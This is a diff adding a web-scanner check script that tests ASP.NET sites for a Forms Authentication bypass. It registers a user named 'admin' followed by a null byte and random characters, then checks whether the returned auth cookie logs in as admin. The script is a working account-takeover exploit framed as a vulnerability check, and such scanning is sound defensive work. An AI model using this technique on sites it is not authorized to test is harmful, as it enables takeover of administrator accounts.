@@ -1,0 +1,132 @@
+#include helpers.inc;
+#include string_helpers.inc;
+#include debug_helpers.inc;
+// **************************************************************************************							 
+function alert(job, username)
+{	
+	var ri = new TReportItem();
+	ri.LoadFromFile("ASP_NET_Forms_Authentication_Bypass.xml");
+	ri.affects = "Web Server";
+	ri.alertPath = "Scripts/ASP_NET_Forms_Authentication_Bypass";	
+	
+	ri.setHttpInfo(job);
+	
+	if (username)
+		ri.Details =  ri.Details + "Username registered: [dark]" + username + "[/dark]";
+	
+	AddReportItem(ri);	
+}
+// **************************************************************************************							 
+function RegistrationPageExists(dirName) {
+	http.url = scanURL;
+	http.addCookies = false;
+	http.verb = 'GET';
+	http.URI = dirName + "Account/Register.aspx?ReturnUrl=";
+	http.execute();	
+	if (!http.wasError && http.responseStatus == 200)
+	{
+		if (http.response.body.indexOf("$MainContent$RegisterUser$CreateUserStepContainer$UserName") != -1)	
+			{
+				return http.response.body;
+			}
+	}
+	
+	return false;
+}
+// **************************************************************************************							 
+function TryToRegisterUser(dirName, postData, username) {
+	http.url = scanURL;
+	http.addCookies = false;
+	http.verb = 'POST';
+	http.URI = dirName + "Account/Register.aspx?ReturnUrl=";
+	http.request.addHeader('Content-type', 'application/x-www-form-urlencoded', true);
+	http.request.body = postData;
+	http.execute();	
+	//trace(http.response.body);
+	
+	if (!http.wasError && http.responseStatus == 302)
+	{
+		//trace('user registered, need confirmation');
+		
+		var cookie = http.response.headersString.match(/Set-Cookie:\s+\.ASPXAUTH=(\w+)\;/);
+		if (cookie && cookie[1]) {		
+			http.url = scanURL;
+			http.verb = 'GET';
+			http.URI = dirName + "Account/Register.aspx?ReturnUrl=";
+			http.request.addHeader('Cookie', '.ASPXAUTH=' + cookie[1], true);
+			http.request.body = "";
+			http.execute();	
+			if (!http.wasError && http.responseStatus == 200)
+			{
+				if (http.response.body.indexOf("<span id=\"HeadLoginView_HeadLoginName\">admin</span>") != -1)	
+					{
+						alert(http, username);
+					}
+			}
+		}
+	}
+	
+	return false;
+}
+/***********************************************************************************/
+/* main entry point */
+var root = getSiteRoot(0);
+var http = new THTTPJob();
+var dirName = root.path + root.Name;
+	
+var response = RegistrationPageExists(dirName);	
+if (response) {
+	var pd = getParserData(response, 'text/html');
+	if (pd) {
+		var forms = pd.getForms();
+		if (forms.count > 0) 
+		{			
+			// identify form
+			var found = -1;
+			for (var i=0; i<forms.count; i++) 
+				if (forms.item(i).action.startsWith("Register.aspx"))
+				{	
+					found = i;
+					break;
+				}
+			
+			if (found != -1) {								
+				// prepare post data for registering a new user
+				var postData = "";
+				var itemCount = forms.item(found).inputs.count;
+				var adminUserName = "";
+				
+				for (var i=0; i<itemCount; i++) 	
+				{				
+					//trace(forms.item(found).inputs.item(i).name);				
+					//trace(forms.item(found).inputs.item(i).defaultValue);				
+					
+					var inputName = forms.item(found).inputs.item(i).name;					
+					var inputValue = plain2urlAll(forms.item(found).inputs.item(i).defaultValue);
+					
+					// prepare input values
+					if (inputName.endsWith('$UserName')) {
+						inputValue = 'admin%00'+ randStr(5); 
+						adminUserName = inputValue;
+					}
+					else 
+					if (inputName.endsWith('$Email')) inputValue = plain2url('admin'+ randStr(5) + '@vulnweb.com'); 
+					else 
+					if (inputName.endsWith('$Password')) inputValue = 'som3P4ssw0rd'; 
+					else 
+					if (inputName.endsWith('$ConfirmPassword')) inputValue = 'som3P4ssw0rd'; 
+					
+					// set some default value (for custom input fields)
+					if (!inputName.startsWith('__') && inputValue=="") inputValue = '1';
+					
+					if (i<itemCount-1) postData = postData + (inputName) + '=' + inputValue + '&'
+					else postData = postData + plain2url(inputName) + '=' + plain2url(inputValue);
+				}
+				
+				//trace(postData);
+				TryToRegisterUser(dirName, postData, adminUserName);				
+			}
+		}	
+	}
+}
+	
